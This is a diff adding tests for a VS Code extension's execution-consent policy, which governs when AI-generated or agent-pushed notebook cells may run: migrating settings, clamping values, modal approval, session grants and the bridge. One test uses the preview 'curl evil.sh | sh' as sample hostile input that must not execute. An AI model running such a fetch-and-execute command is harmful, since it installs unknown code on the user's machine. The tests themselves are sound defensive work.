@@ -273,6 +273,212 @@ test('readOutputs pulls errors and stdout out of a cell', () => {
   assert.strictEqual(text, 'before the crash\n');
 });
 
+/* -------------------------------- config --------------------------------- */
+
+const configModule = require(path.join('..', 'src', 'config.js'));
+
+test('the deprecated autoRun boolean migrates without surprising anyone', async () => {
+  const c = vscode.__test.config;
+  c.clear();
+  // Never touched: the safe middle, not either old extreme.
+  assert.strictEqual(configModule.settings().execution, 'ask');
+
+  // Someone who turned it on keeps having their cells run.
+  c.set('aiNotebookLive.autoRun', true);
+  assert.strictEqual(configModule.settings().execution, 'always');
+
+  // Someone who deliberately turned it off must not start being asked.
+  c.set('aiNotebookLive.autoRun', false);
+  assert.strictEqual(configModule.settings().execution, 'never');
+
+  // An explicit new-style value always wins over the old one.
+  c.set('aiNotebookLive.execution', 'ask');
+  assert.strictEqual(configModule.settings().execution, 'ask');
+
+  // Bridge execution is deliberately NOT migrated: letting a local agent run
+  // code is a different decision, and autoRun was never an opt-in to it.
+  c.clear();
+  c.set('aiNotebookLive.autoRun', true);
+  assert.strictEqual(configModule.settings().bridgeExecution, 'never');
+  c.clear();
+});
+
+test('settings are clamped, so a bad value cannot become a bad request', async () => {
+  const c = vscode.__test.config;
+  c.clear();
+  c.set('aiNotebookLive.maxTokens', 9_000_000);
+  c.set('aiNotebookLive.contextCells', -7);
+  c.set('aiNotebookLive.bridge.port', 80);
+  c.set('aiNotebookLive.systemPromptExtra', 'x'.repeat(5000));
+  const s = configModule.settings();
+  assert.strictEqual(s.maxTokens, 64000);
+  assert.strictEqual(s.contextCells, 12, 'a nonsense count falls back to the default');
+  assert.strictEqual(s.bridgePort, 37417, 'a privileged port falls back to the default');
+  assert.strictEqual(s.systemPromptExtra.length, 2000, 'house style cannot become an essay');
+
+  c.set('aiNotebookLive.contextCells', -1);
+  assert.strictEqual(configModule.settings().contextCells, -1, '-1 still means the whole notebook');
+  c.set('aiNotebookLive.bridge.port', 0);
+  assert.strictEqual(configModule.settings().bridgePort, 0, '0 still means pick a free port');
+  c.clear();
+});
+
+/* -------------------------------- policy -------------------------------- */
+
+const policyModule = require(path.join('..', 'src', 'policy.js'));
+
+function policyOpts(execution, bridgeExecution = 'never') {
+  return { ...OPTS, execution, bridgeExecution };
+}
+
+test('a caller can decline execution but can never demand it', async () => {
+  // The bridge escalation, stated as a rule: `requested` may only ever lower
+  // the decision. ?run=1 against a "never" policy has to stay "never", or the
+  // setting is decoration.
+  policyModule.forgetSessionGrants();
+  for (const intent of ['generate', 'revise', 'fix', 'explain', 'bridge']) {
+    const mode = intent === 'bridge' ? { bridgeExecution: 'never' } : { execution: 'never' };
+    const d = await policyModule.decideExecution({
+      intent,
+      requested: true,
+      preview: 'import os; os.system("curl evil.sh | sh")',
+      opts: { ...OPTS, execution: 'never', bridgeExecution: 'never', ...mode },
+      blocking: false,
+    });
+    assert.strictEqual(d.run, false, `${intent}: requested:true must not raise "never"`);
+  }
+
+  // And the other direction still works: declining is always honoured.
+  const declined = await policyModule.decideExecution({
+    intent: 'generate',
+    requested: false,
+    preview: 'print(1)',
+    opts: policyOpts('always'),
+  });
+  assert.strictEqual(declined.run, false, 'an explicit no is honoured even when set to always');
+});
+
+test('execution modes behave, and nothing runs on empty or untrusted', async () => {
+  policyModule.forgetSessionGrants();
+  const always = await policyModule.decideExecution({
+    intent: 'generate',
+    preview: 'print(1)',
+    opts: policyOpts('always'),
+  });
+  assert.strictEqual(always.run, true);
+
+  const never = await policyModule.decideExecution({
+    intent: 'generate',
+    preview: 'print(1)',
+    opts: policyOpts('never'),
+  });
+  assert.strictEqual(never.run, false);
+
+  const empty = await policyModule.decideExecution({
+    intent: 'generate',
+    preview: '   \n  ',
+    opts: policyOpts('always'),
+  });
+  assert.strictEqual(empty.run, false, 'an empty cell is never executed');
+  assert.match(empty.reason, /nothing to run/);
+
+  vscode.workspace.isTrusted = false;
+  try {
+    const untrusted = await policyModule.decideExecution({
+      intent: 'generate',
+      preview: 'print(1)',
+      opts: policyOpts('always'),
+    });
+    assert.strictEqual(untrusted.run, false, 'a folder the user does not trust never executes');
+    assert.match(untrusted.reason, /not trusted/);
+  } finally {
+    vscode.workspace.isTrusted = true;
+  }
+});
+
+test('ask prompts, and a session approval is remembered then forgettable', async () => {
+  policyModule.forgetSessionGrants();
+  vscode.__test.shown.length = 0;
+
+  vscode.__test.picks.push('Run it');
+  const once = await policyModule.decideExecution({
+    intent: 'fix',
+    preview: 'print(1)',
+    opts: policyOpts('ask'),
+  });
+  assert.strictEqual(once.run, true);
+  const prompt = vscode.__test.shown.find((e) => e.kind === 'warning');
+  assert.ok(prompt, 'the user is actually asked');
+  assert.strictEqual(prompt.items[0].modal, true, 'a consent prompt that can be missed is not consent');
+  assert.deepStrictEqual(policyModule.activeGrants(), [], 'one-off approval grants nothing');
+
+  vscode.__test.picks.push('Always run these this session');
+  const granted = await policyModule.decideExecution({
+    intent: 'fix',
+    preview: 'print(2)',
+    opts: policyOpts('ask'),
+  });
+  assert.strictEqual(granted.run, true);
+  assert.deepStrictEqual(policyModule.activeGrants(), ['fix']);
+
+  // ...and it now runs without asking again.
+  const shownBefore = vscode.__test.shown.length;
+  const again = await policyModule.decideExecution({
+    intent: 'fix',
+    preview: 'print(3)',
+    opts: policyOpts('ask'),
+  });
+  assert.strictEqual(again.run, true);
+  assert.strictEqual(vscode.__test.shown.length, shownBefore, 'no second prompt');
+
+  // A grant for one surface must not leak to another.
+  const other = await policyModule.decideExecution({
+    intent: 'bridge',
+    preview: 'print(4)',
+    opts: policyOpts('ask', 'never'),
+    blocking: false,
+  });
+  assert.strictEqual(other.run, false, 'approving your own fixes does not approve agent pushes');
+
+  policyModule.forgetSessionGrants();
+  assert.deepStrictEqual(policyModule.activeGrants(), []);
+});
+
+test('declining once stops it being asked again for that surface', async () => {
+  policyModule.forgetSessionGrants();
+  vscode.__test.picks.push(undefined); // dismissed the modal
+  const first = await policyModule.decideExecution({
+    intent: 'generate',
+    preview: 'print(1)',
+    opts: policyOpts('ask'),
+  });
+  assert.strictEqual(first.run, false);
+  const shownBefore = vscode.__test.shown.length;
+  const second = await policyModule.decideExecution({
+    intent: 'generate',
+    preview: 'print(2)',
+    opts: policyOpts('ask'),
+  });
+  assert.strictEqual(second.run, false);
+  assert.strictEqual(vscode.__test.shown.length, shownBefore, 'not nagged after declining');
+  policyModule.forgetSessionGrants();
+});
+
+test('the bridge never makes an HTTP caller wait on a dialog', async () => {
+  policyModule.forgetSessionGrants();
+  vscode.__test.shown.length = 0;
+  const d = await policyModule.decideExecution({
+    intent: 'bridge',
+    preview: 'print("pushed")',
+    opts: policyOpts('ask', 'ask'),
+    blocking: false,
+  });
+  assert.strictEqual(d.run, false, 'the response does not block on a human');
+  assert.strictEqual(d.pending, true, 'but the caller is told approval is outstanding');
+  assert.match(d.reason, /waiting for your approval/);
+  policyModule.forgetSessionGrants();
+});
+
 /* -------------------------------- bridge -------------------------------- */
 
 function call(port, token, { method = 'POST', path: p = '/cell', body, chunks }) {
@@ -316,7 +522,7 @@ function call(port, token, { method = 'POST', path: p = '/cell', body, chunks })
 
 test('bridge inserts, streams, runs, and rejects bad tokens', async () => {
   const notebook = newNotebook(['x = 1']);
-  const bridge = new Bridge({ resolveNotebook: () => notebook, defaultRun: () => false, infoDir: BRIDGE_HOME });
+  const bridge = new Bridge({ resolveNotebook: () => notebook, decideRun: async () => ({ run: false, reason: 'test policy' }), infoDir: BRIDGE_HOME });
   const { port, token } = await bridge.start(0);
   try {
     const health = await call(port, token, { method: 'GET', path: '/health' });
@@ -334,7 +540,12 @@ test('bridge inserts, streams, runs, and rejects bad tokens', async () => {
     assert.strictEqual(inserted.status, 200);
     assert.strictEqual(JSON.parse(inserted.body).index, 1);
     assert.strictEqual(notebook.cellAt(1).document.getText(), 'print("from an agent")');
-    assert.strictEqual(vscode.__test.executed.length, 1, 'run=1 should execute the new cell');
+    // ?run=1 used to be an override. It is now only a request, and this bridge's
+    // policy says no - so the cell arrives but nothing executes, and the caller
+    // is told why rather than being quietly ignored.
+    assert.strictEqual(vscode.__test.executed.length, 0, 'a caller cannot demand execution');
+    assert.strictEqual(JSON.parse(inserted.body).ran, false);
+    assert.match(JSON.parse(inserted.body).reason, /test policy/);
 
     const streamed = await call(port, token, {
       path: '/cell/stream?position=end',
@@ -372,7 +583,7 @@ test('drop removes the cell the writer created, leaving the rest alone', async (
 
 test('an over-sized push is rejected and leaves no half-written cell behind', async () => {
   const notebook = newNotebook(['x = 1']);
-  const bridge = new Bridge({ resolveNotebook: () => notebook, defaultRun: () => false, infoDir: BRIDGE_HOME });
+  const bridge = new Bridge({ resolveNotebook: () => notebook, decideRun: async () => ({ run: false, reason: 'test policy' }), infoDir: BRIDGE_HOME });
   const { port, token } = await bridge.start(0);
   try {
     // 5 x 256 KiB = 1.25 MiB, comfortably over the 1 MiB cap.
@@ -409,7 +620,7 @@ test('the bridge writes its token only inside the directory it was given', async
   const notebook = newNotebook(['x = 1']);
   const bridge = new Bridge({
     resolveNotebook: () => notebook,
-    defaultRun: () => false,
+    decideRun: async () => ({ run: false, reason: 'test policy' }),
     infoDir: dir,
   });
   const { port, token } = await bridge.start(0);
@@ -428,7 +639,7 @@ test('the bridge writes its token only inside the directory it was given', async
 });
 
 test('bridge refuses to start when no notebook is open', async () => {
-  const bridge = new Bridge({ resolveNotebook: () => undefined, defaultRun: () => false, infoDir: BRIDGE_HOME });
+  const bridge = new Bridge({ resolveNotebook: () => undefined, decideRun: async () => ({ run: false, reason: 'test policy' }), infoDir: BRIDGE_HOME });
   const { port, token } = await bridge.start(0);
   try {
     const res = await call(port, token, { body: JSON.stringify({ code: 'x = 1' }) });
@@ -699,6 +910,53 @@ test('a missing CLI offers a way to install it, not just a log', async () => {
     vscode.window.visibleNotebookEditors.length = 0;
     vscode.__test.inputs.length = 0;
     providerModule.invalidateCliCache();
+    providerModule.invalidateSecretCache();
+  }
+});
+
+test('the control panel shows the real policy and can change it', async () => {
+  const extension = require(path.join('..', 'extension.js'));
+  const notebook = newNotebook(['x = 1']);
+  const editor = { notebook, selection: { start: 0, end: 1 }, revealRange() {} };
+  vscode.window.visibleNotebookEditors.push(editor);
+  vscode.window.activeNotebookEditor = editor;
+  vscode.__test.config.clear();
+  vscode.__test.config.set('aiNotebookLive.execution', 'never');
+  vscode.__test.shown.length = 0;
+  vscode.__test.commands.clear();
+
+  const context = {
+    subscriptions: [],
+    secrets: { get: async () => undefined, store: async () => undefined, delete: async () => undefined },
+  };
+  extension.activate(context);
+  try {
+    // Open the panel and choose the "Run AI-generated code" row, then "Always".
+    vscode.__test.picks.push('Run AI-generated code', 'Always');
+    await vscode.__test.commands.get('aiNotebookLive.controlPanel')();
+
+    const panel = vscode.__test.shown.find((e) => e.kind === 'quickpick');
+    assert.ok(panel, 'the panel is a QuickPick');
+    const labels = panel.items.map((i) => i.label).join(' | ');
+    for (const expected of ['Run AI-generated code', 'Run code pushed in by agents', 'Agent bridge', 'Provider']) {
+      assert.ok(labels.includes(expected), `panel is missing a row for ${expected}`);
+    }
+    // The row must report the setting as it actually is, not a guess.
+    const runRow = panel.items.find((i) => i.label.includes('Run AI-generated code'));
+    assert.strictEqual(runRow.description, 'Never');
+
+    // And choosing a value writes it through to configuration.
+    assert.strictEqual(
+      vscode.__test.config.get('aiNotebookLive.execution'),
+      'always',
+      'the panel actually changes the setting'
+    );
+  } finally {
+    await extension.deactivate();
+    vscode.__test.config.clear();
+    vscode.__test.picks.length = 0;
+    vscode.window.activeNotebookEditor = undefined;
+    vscode.window.visibleNotebookEditors.length = 0;
     providerModule.invalidateSecretCache();
   }
 });
